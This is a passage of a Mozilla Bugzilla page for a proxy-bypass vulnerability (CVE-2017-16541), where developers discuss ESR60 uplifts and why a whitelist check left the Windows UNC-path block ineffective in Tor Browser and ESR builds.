        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-121"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-121" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c121">Comment 121</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-07 14:31 PDT" data-time="1533677505">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-121">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-121" data-comment-id="13528504">In the future, it would be really nice if the follow-up patches were folded into the main patch for landing.</pre></div><div class="change-set" id="c122"><div class="comment" data-id="13528524" data-no="122"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-122" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a24623039_75935"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a24623039_75935"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-122"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-122" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c122">Comment 122</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-07 14:37 PDT" data-time="1533677830">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-122">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-122" data-comment-id="13528524">(In reply to Ryan VanderMeulen [:RyanVM] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c121">comment #121</a>)
<span class="quote">&gt; In the future, it would be really nice if the follow-up patches were folded
&gt; into the main patch for landing.</span >

Will do. Thanks!</pre></div><div class="change-set" id="c123"><div class="comment" data-id="13528532" data-no="123"
       data-tags="uplift">
    
    <table class="layout-table change-head " id="ch-123" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a24623039_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a24623039_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-123"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-123" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c123">Comment 123</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-07 14:39 PDT" data-time="1533677945">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-123">
        <td colspan="2" class="comment-tags"><span class="comment-tag">uplift</span>
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-123" data-comment-id="13528532"><a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-esr60/rev/8a1e8be23bad">https://hg.mozilla.org/releases/mozilla-esr60/rev/8a1e8be23bad</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-esr60/rev/6a1df03e37c9">https://hg.mozilla.org/releases/mozilla-esr60/rev/6a1df03e37c9</a></pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=isnotempty">status-firefox-esr60</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="a25217315_269762"><div class="change" id="aa25217315_269762">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a25217315_269762"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_269762" id="a25217315_269762"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a25217315_269762"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a25217315_269762">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a25217315_269762">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-14 09:14 PDT" data-time="1534263249">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - proxy bypass on windows via smb"
   href="/show_bug.cgi?id=1413868">1413868</a></div></div></div><div class="change-set" id="c124"><div class="comment" data-id="13543958" data-no="124"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-124" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a25217315_269762"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_269762" id="a25217315_269762"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-124"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-124" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c124">Comment 124</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-14 09:29 PDT" data-time="1534264144">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-124">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-124" data-comment-id="13543958">Valentin, there seems to be some kind of discrepancy between our code base and the tore code base on ESR60 (IIUC).

Our code (the current, latest changeset):
<a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-esr60/annotate/8a1e8be23bad/xpcom/io/FilePreferences.cpp#l263">https://hg.mozilla.org/releases/mozilla-esr60/annotate/8a1e8be23bad/xpcom/io/FilePreferences.cpp#l263</a>

Tor code:
(patch) <a rel="nofollow" href="https://gitweb.torproject.org/user/richard/tor-browser.git/commit/xpcom/io/FilePreferences.cpp?h=bug_26874&amp;id=50f4653b90316394e7d6d3cd4a3e92e12f377666">https://gitweb.torproject.org/user/richard/tor-browser.git/commit/xpcom/io/FilePreferences.cpp?h=bug_26874&amp;id=50f4653b90316394e7d6d3cd4a3e92e12f377666</a>
(file) <a rel="nofollow" href="https://gitweb.torproject.org/user/richard/tor-browser.git/tree/xpcom/io/FilePreferences.cpp?h=bug_26874&amp;id=50f4653b90316394e7d6d3cd4a3e92e12f377666#n263">https://gitweb.torproject.org/user/richard/tor-browser.git/tree/xpcom/io/FilePreferences.cpp?h=bug_26874&amp;id=50f4653b90316394e7d6d3cd4a3e92e12f377666#n263</a>

Please see <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - proxy bypass on windows via smb"
   href="/show_bug.cgi?id=1413868#c70">https://bugzilla.mozilla.org/show_bug.cgi?id=1413868#c70</a> for further details.  They claim that the patches don't work and removing the |if (!sWhitelist) { return false; }| part fixes it.

It may be that AllowUNCDirectory() which ensures sWhitelist is not called from some reason.

Maybe we should change the code to block all unc paths when sWhitelist is null and sBlockUNCPaths == true?


It's hard to track what's actually correct with all the backouts and merges.


Note: <a rel="nofollow" href="https://dxr.mozilla.org/mozilla-esr60/">https://dxr.mozilla.org/mozilla-esr60/</a> is out of sync ://</pre><div class="activity"><div class="change">Flags: needinfo?(valentin.gosu)</div></div></div><div class="change-set" id="c125"><div class="comment" data-id="13544222" data-no="125"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-125" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_417117" id="a25217315_269762"><img src="https://secure.gravatar.com/avatar/12db67bc4d6bdaf340543be035b512a5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_417117" id="a25217315_269762"><a class="email " href="/user_profile?user_id=417117" > <span class="fna">Richard Pospesel (Tor Browser Dev)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-125"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-125" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c125">Comment 125</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-14 11:09 PDT" data-time="1534270166">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-125">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-125" data-comment-id="13544222">Ok I have access now!

Yeah so the issue here is that sWhitelist is only populated after a call to PathWhitelist().  The various directories are whitelisted during firefox init (and sWhitelist is populated) in AllowUNCDirectory(char const*) by way of InitDirectoriesWhitelist().  However, the call to PathWhitelist() does not occur until the end of AllowUNCDirectory(), and only if the directory resolves to an SMB path (ie, begins with \\).  So, unless one of the special dirs live on an SMB share, sWhitelist will never be populated, and the call to IsBlockedUNCPath() will always early out due to the !sWhiteList check.

The !sWhitelist check should be removed, since the underlying pointer is never accessed directly, and always through the PathWhitelist() getter/initializer.

I've a screenshot ( here: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - proxy bypass on windows via smb"
   href="/show_bug.cgi?id=1413868">https://bugzilla.mozilla.org/show_bug.cgi?id=1413868</a> ) demoing the proxy bypass still exists in ESR60 on Windows 7.</pre></div><div class="change-set" id="c126"><div class="comment" data-id="13544664" data-no="126"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-126" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a25217315_269762"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a25217315_269762"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-126"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-126" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c126">Comment 126</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-14 14:11 PDT" data-time="1534281102">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-126">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-126" data-comment-id="13544664">(In reply to Honza Bambas (:mayhemer) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c124">comment #124</a>)
<span class="quote">&gt; Valentin, there seems to be some kind of discrepancy between our code base
&gt; and the tore code base on ESR60 (IIUC).</span >

I think that's because TOR landed the patch in before <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c89">comment 89</a> (<span class="bz_obsolete"><a href="/attachment.cgi?id=8986596" name="attach_8986596" title="[ESR60]  patch">attachment 8986596</a> <a href="/attachment.cgi?id=8986596&amp;action=edit" title="[ESR60]  patch">[details]</a> <a href="/attachment.cgi?id=8986596&amp;action=diff" title="[ESR60]  patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8986596'>[review]</a>) and the ESR patch landed a bit later, with a few nits.

The version in m-c actually does not contain the sWhitelist thing, since the leak didn't happen on Windows, so I assume we should probably update TOR and ESR.

(In reply to Richard Pospesel (Tor Browser Dev) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c125">comment #125</a>)
<span class="quote">&gt; The !sWhitelist check should be removed, since the underlying pointer is
&gt; never accessed directly, and always through the PathWhitelist()
&gt; getter/initializer.</span >

I agree. I'll file a separate bug for it.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(valentin.gosu)</span></div></div></div><div class="change-set" id="a25235399_415378"><div class="change" id="aa25235399_415378">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a25235399_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_415378" id="a25235399_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a25235399_415378"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a25235399_415378">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a25235399_415378">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-14 14:15 PDT" data-time="1534281333">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Use static array for sWhitelist instead of StaticAutoPtr"
   href="/show_bug.cgi?id=1483377">1483377</a></div></div></div><div class="change-set" id="a25742059_280903"><div class="change" id="aa25742059_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a25742059_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a25742059_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a25742059_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a25742059_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a25742059_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-20 10:59 PDT" data-time="1534787993">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [tor 24052][sec-critical for Tor][necko-triaged][post-critsmash-triage] &rarr; [tor 24052][sec-critical for Tor][necko-triaged][post-critsmash-triage][adv-main62+][adv-esr60.2+]</div></div></div><div class="change-set" id="a56176711_1689"><div class="change" id="aa56176711_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a56176711_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a56176711_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a56176711_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a56176711_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a56176711_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-07 17:04 PDT" data-time="1565222645">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: <span class="activity-deleted">core-security-release</span></div></div></div><div id="new-comment-notice">
          You need to <a href="/show_bug.cgi?id=1412081&amp;GoAheadAndLogIn=1">log in</a>
          before you can comment on or make changes to this bug.
        </div>



<div id="bottom-actions">
  <div id="bottom-right-actions">
    <button type="button" id="top-btn" class="secondary" aria-label="Go to Page Top">Top &uarr;</button>
  </div>
</div></div> 
</main> 
</div> 


</body>
</html>